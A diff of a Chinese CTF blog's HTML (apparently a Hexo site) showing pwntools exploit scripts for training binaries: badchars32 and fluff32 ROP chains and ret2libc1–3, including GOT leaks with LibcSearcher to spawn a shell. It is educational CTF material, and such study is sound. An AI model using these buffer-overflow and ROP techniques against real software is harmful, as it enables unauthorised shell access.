class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./badchars32'</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">xor_ebx_cl = <span class="number">0x8048890</span></span><br><span class="line">pop_ebx_ecx = <span class="number">0x8048896</span></span><br><span class="line">mov_edi_esi = <span class="number">0x8048893</span></span><br><span class="line">pop_edi_esi = <span class="number">0x8068899</span></span><br><span class="line">data_addr = <span class="number">0x804A040</span></span><br><span class="line">bin = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">xor_byte = <span class="number">0x1b</span></span><br><span class="line"></span><br><span class="line">bad_char = [<span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>]</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">xor_bin=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bin:</span><br><span class="line">c = ord(i)^xor_byte</span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> bad_char:</span><br><span class="line">xor_byte += <span class="number">0x1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">xor_bin+=chr(c)</span><br><span class="line"><span class="keyword">if</span> len(xor_bin)==<span class="number">8</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pad = <span class="string">'a'</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload = pad + p32(pop_edi_esi) +xor_bin[:<span class="number">4</span>]+ p32(data_addr) +p32(mov_edi_esi) + p32(pop_edi_esi)+xor_bin[<span class="number">4</span>:<span class="number">8</span>]+p32(data_addr+<span class="number">4</span>) +p32(mov_edi_esi)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(xor_bin)):</span><br><span class="line">payload += p32(pop_ebx_ecx) + p32(data_addr+i) + p32(xor_byte) + p32(xor_ebx_cl)</span><br><span class="line">payload+= p32(system_addr) + <span class="number">4</span>*<span class="string">'a'</span> +p32(data_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./badchars32'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这次题目和之前的也没区别，还是只有system，需要我们自己去写入/bin/sh，我们最理想的应该是类似mov [edi] ebp这样的指令了，但是gadgets没有那么合适的了，需要我们花一番心思去构造，我们可以先看一看这次的gadgets都有些什么</p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14f4fea639.jpg" alt="7.jpg"></p>
 <p>可以看到可用的mov指令就这一个，还拖家带口了一堆别的指令。那第一步的思路就清楚了，把data的地址想办法给ecx，把字符串想办法给edx，那问题就又来了，我们没有现成的pop指令啊，唯一的一个pop是ebx的</p>
@@ -752,8 +1169,10 @@
 <p>仔细观察了一番发现竟然又个xchg可以用来交换数据，那就是说我们可以在edx和ecx之间交换数据了，也就是说经过这道工序我们只需要想一个办法把edx或者ecx的其中一个能够写入数据，剩下的一个也就不攻自破了</p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14f5183f79.jpg" alt="9.jpg"></p>
 <p>接着我们又找到了xor edx edx，这可以把edx置为0，而xor edx ebx在edx为0的时候就相当于把ebx的值给了edx啊，也就是说我们可以通过写入ebx，同时将edx置为0，然后二者xor使得edx变为我们写入的数据！这样我们就有了构造rop chain的基本思路！开写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import \*</span><br><span class="line"></span><br><span class="line">p = process(&apos;./fluff32&apos;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./fluff32&apos;)</span><br><span class="line"></span><br><span class="line">system\_addr = elf.plt[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">data\_addr = 0x0804a028</span><br><span class="line"></span><br><span class="line">mov\_ecx\_edx = 0x8048693</span><br><span class="line"></span><br><span class="line">xchg\_edx\_ecx = 0x8048689</span><br><span class="line"></span><br><span class="line">xor\_edx\_ebx = 0x804867b</span><br><span class="line"></span><br><span class="line">xor\_edx\_edx = 0x8048671</span><br><span class="line"></span><br><span class="line">pop\_ebx = 0x080483e1</span><br><span class="line"></span><br><span class="line">def mov\_bin\_sh(addr,data):</span><br><span class="line"></span><br><span class="line">pad = 4\*&apos;a&apos;</span><br><span class="line"></span><br><span class="line">payload=&quot;&quot;</span><br><span class="line"></span><br><span class="line">payload+=p32(xor\_edx\_edx)+pad+p32(pop\_ebx)+p32(addr)+p32(xor\_edx\_ebx)+pad+p32(xchg\_edx\_ecx)+pad</span><br><span class="line"></span><br><span class="line">payload+=p32(xor\_edx\_edx)+pad+p32(pop\_ebx)+data+p32(xor\_edx\_ebx)+pad</span><br><span class="line"></span><br><span class="line">payload+=p32(mov\_ecx\_edx)+pad+p32(0)</span><br><span class="line"></span><br><span class="line">return payload</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos; \*44</span><br><span class="line"></span><br><span class="line">payload+=mov\_bin\_sh(data\_addr,&apos;/bin&apos;)</span><br><span class="line"></span><br><span class="line">payload+=mov\_bin\_sh(data\_addr+4,&apos;/sh\\x00&apos;)</span><br><span class="line"></span><br><span class="line">payload+=p32(system\_addr)+4\*&apos;a&apos;+p32(data\_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./fluff32&apos;)</span><br><span class="line">elf = ELF(&apos;./fluff32&apos;)</span><br><span class="line">system_addr = elf.plt[&apos;system&apos;]</span><br><span class="line">data_addr = 0x0804a028</span><br><span class="line">mov_ecx_edx = 0x8048693</span><br><span class="line">xchg_edx_ecx = 0x8048689</span><br><span class="line">xor_edx_ebx = 0x804867b</span><br><span class="line">xor_edx_edx = 0x8048671</span><br><span class="line">pop_ebx = 0x080483e1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mov_bin_sh(addr,data):</span><br><span class="line">pad = 4*&apos;a&apos;</span><br><span class="line">payload=&quot;&quot;</span><br><span class="line">payload+=p32(xor_edx_edx)+pad+p32(pop_ebx)+p32(addr)+p32(xor_edx_ebx)+pad+p32(xchg_edx_ecx)+pad</span><br><span class="line">payload+=p32(xor_edx_edx)+pad+p32(pop_ebx)+data+p32(xor_edx_ebx)+pad</span><br><span class="line">payload+=p32(mov_ecx_edx)+pad+p32(0)</span><br><span class="line">return payload</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos; *44</span><br><span class="line">payload+=mov_bin_sh(data_addr,&apos;/bin&apos;)</span><br><span class="line">payload+=mov_bin_sh(data_addr+4,&apos;/sh\x00&apos;)</span><br><span class="line">payload+=p32(system_addr)+4*&apos;a&apos;+p32(data_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>Exp很简单，就一个地方需要特殊说明一下，为什么最后mov_bin_sh需要+p32(0)呢？这是因为我们执行的mov_ecx_edx的gadget在最后会先pop ebp、pop ebx，而之后将xor [ecx] bl，所以我们需要把ebx设为0，这样任何数xor0都等于它本身，这样也就是实现了我们的ecx不变的目的</p>
+<p>另外这些题目也可以用泄漏got的方法拿到libc里的/bin/sh字符，这里就贴出exp，有兴趣的可以c试一试，要比组织rop chain简单不少</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">p = process(<span class="string">'./fluff32'</span>)</span><br><span class="line">e = ELF(<span class="string">'./fluff32'</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib/i386-linux-gnu/libc.so.6")</span></span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'pwnme'</span>]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(flat([<span class="string">'A'</span> * <span class="number">44</span>, puts_plt, main, puts_got]))</span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.info(<span class="string">"putsaddr : 0x%x"</span> % puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line"><span class="comment">#libc_addr = puts_addr - libc.symbols["puts"]</span></span><br><span class="line"><span class="comment">#log.info("libc : 0x%x" % libc_addr)</span></span><br><span class="line"><span class="comment">#system_addr = libc_addr + libc.symbols["system"]</span></span><br><span class="line"><span class="comment">#binsh_addr = 427065 + libc_addr</span></span><br><span class="line"><span class="comment">#log.info("bin : 0x%x" % binsh_addr)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">log.info(<span class="string">"libc : 0x%x"</span> % libcbase)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">log.info(<span class="string">"bin : 0x%x"</span> % binsh_addr)</span><br><span class="line">p.sendline(flat([<span class="string">'A'</span> * <span class="number">44</span>, system_addr, <span class="string">'b'</span>*<span class="number">4</span>, binsh_addr]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>successful</p>
 
           
@@ -904,35 +1323,23 @@
 <p><img src="https://i.loli.net/2018/11/18/5bf14d799d6b0.jpg" alt="2.jpg"></p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14d79dd2f6.jpg" alt="3.jpg"></p>
 <p>可以看到程序非常大方的给了我们/bin/sh的字符串和system函数，那任务就结束了，我们只需要溢出s将函数的返回地址设置为system的地址，紧接着将system的参数设置为字符串的地址即可，直接上脚本了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
-
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
 p = process(<span class="string">'./ret2libc1.dms'</span>)
-
 system = <span class="number">0x8048460</span>
-
 bin = <span class="number">0x08048720</span>
-
-payload = flat([<span class="string">'a'</span>\*<span class="number">112</span>,system,<span class="string">'b'</span>\*<span class="number">4</span>],bin)
-
+payload = flat([<span class="string">'a'</span>*<span class="number">112</span>,system,<span class="string">'b'</span>*<span class="number">4</span>],bin)
 p.sendline(payload)
-
 p.interactive()
+
 </code></pre>
 <p>注意，我们的system作为我们将要返回的函数，他自然也有要返回的函数，因为我们只需要拿到sh，所以他具体返回什么我们就不用操心了，所以直接拿4个b把他的返回地址给填充掉就好了。当然，这是我们手动找到了system函数的地址，是不是还有其他的办法呢？当然有了，脚本一改</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
-
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
 p = process(<span class="string">'./ret2libc1.dms'</span>)
-
 elf = ELF(<span class="string">'./ret2libc1.dms'</span>)
-
-system\_addr = elf.plt[<span class="string">'system'</span>]
-
-bin\_addr = <span class="number">0x8048720</span>
-
-payload = <span class="number">112</span>\*<span class="string">'a'</span> + p32(system\_addr) +<span class="string">'b'</span>\*<span class="number">4</span> + p32(bin\_addr)
-
+system_addr = elf.plt[<span class="string">'system'</span>]
+bin_addr = <span class="number">0x8048720</span>
+payload = <span class="number">112</span>*<span class="string">'a'</span> + p32(system_addr) +<span class="string">'b'</span>*<span class="number">4</span> + p32(bin_addr)
 p.sendline(payload)
-
 p.interactive()
 </code></pre>
 <p>这里我们使用了ELF加载了我们的程序，而ELF的plt中就是保存着我们的地址与函数的一一映射，因此我们用plt[‘system’]就可以拿到system的地址了</p>
@@ -943,61 +1350,38 @@ p.interactive()
 <p>首先就是天时啊，程序有个gets的函数，那我们何不借东风？拿它来一招瞒天过海？</p>
 <p><img src="https://i.loli.net/2018/11/18/5bf14d7a36b5a.jpg" alt="6.jpg"></p>
 <p>其次地利也有啊，bss段又个0x64长度的buf2数组没被用过，刚好我们瞒天过海而来的字符串就由它再暗度陈仓了。天时地利，就差exp了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
-
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
 p = process(<span class="string">'./ret2libc2.dms'</span>)
-
 elf = ELF(<span class="string">'./ret2libc2.dms'</span>)
-
-gets\_addr = elf.plt[<span class="string">'gets'</span>]
-
-system\_addr = elf.plt[<span class="string">'system'</span>]
-
-pop\_ebx = <span class="number">0x0804843d</span>
-
+gets_addr = elf.plt[<span class="string">'gets'</span>]
+system_addr = elf.plt[<span class="string">'system'</span>]
+pop_ebx = <span class="number">0x0804843d</span>
 buf2 = <span class="number">0x804A080</span>
-
-payload = <span class="number">112</span>\*<span class="string">'a'</span> + p32(gets\_addr) + p32(pop\_ebx) + p32(buf2) + p32(system\_addr) + <span class="number">4</span>\*<span class="string">'a'</span> + p32(buf2)
-
+payload = <span class="number">112</span>*<span class="string">'a'</span> + p32(gets_addr) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + <span class="number">4</span>*<span class="string">'a'</span> + p32(buf2)
 p.sendline(payload)
-
 p.sendline(<span class="string">"/bin/sh"</span>)
-
 p.interactive()
+
 </code></pre>
 <p>这里简单提一句为什么会有个pop ebx，主要是gets函数其实是改变了堆栈状态的，我们这里使用了pop主要是为了平衡堆栈的，你pop谁都可以，add也行。</p>
 <p>趁热打铁把第三题也做了，这个题比起上面的两个题难度系数高了很多，这次是既没有了system函数也没有了/bin/sh，那就比较麻烦了，我们要找的东西可就多了。不过有个好消息就是我们的system函数是属于libc，而libc.so里函数的相对偏移是一定的，更让人高兴的是即使程序ASLR的保护，也只是针对地址的中间位进行随机，最低的12位并不会发生改变，而这些github上都有人把工作给我们做好了，我们只需要知道一个函数在libc的地址，就可以顺藤摸瓜搞到所有函数（甚至还有字符串/bin/sh）的地址，这样就人工创造了天时地利，只差我们的exp了</p>
-<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> \*
-
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
 <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher
-
 p = process(<span class="string">'./ret2libc3.dms'</span>)
-
 e = ELF(<span class="string">'./ret2libc3.dms'</span>)
-
-puts\_plt = e.plt[<span class="string">'puts'</span>]
-
-puts\_got = e.got[<span class="string">'puts'</span>]
-
+puts_plt = e.plt[<span class="string">'puts'</span>]
+puts_got = e.got[<span class="string">'puts'</span>]
 main = e.symbols[<span class="string">'main'</span>]
-
 p.recv()
-
-p.sendline(flat([<span class="string">'A'</span> \* <span class="number">0x70</span>, puts\_plt, main, puts\_got]))
-
-puts\_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])
-
-libc = LibcSearcher(<span class="string">'puts'</span>, puts\_addr)
-
-libcbase = puts\_addr - libc.dump(<span class="string">'puts'</span>)
-
-system\_addr = libcbase + libc.dump(<span class="string">'system'</span>)
-
-binsh\_addr = libcbase + libc.dump(<span class="string">'str\_bin\_sh'</span>)
-
-p.sendline(flat([<span class="string">'A'</span> \* <span class="number">104</span>, system\_addr, <span class="string">'b'</span>\*<span class="number">4</span>, binsh\_addr]))
-
+p.sendline(flat([<span class="string">'A'</span> * <span class="number">0x70</span>, puts_plt, main, puts_got]))
+puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])
+libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)
+libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)
+system_addr = libcbase + libc.dump(<span class="string">'system'</span>)
+binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)
+p.sendline(flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="string">'b'</span>*<span class="number">4</span>, binsh_addr]))
 p.interactive()
+
 </code></pre>
 <p>这里用到了新的工具—LibcSearcher，这个工具主要是能够帮助我们轻松的利用已有的got表的泄漏快速找到我们想要的东西，用法也很简单LibcSeacher(‘函数名’,地址)得到了libc，之后libc.dump()就可以得到偏移了，之后按照之前的方法构造payload就好了。要注意这里我们的pad要-8，因为我们是在main函数里又调用了main函数。</p>
 <p>successful</p>
@@ -1261,7 +1645,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
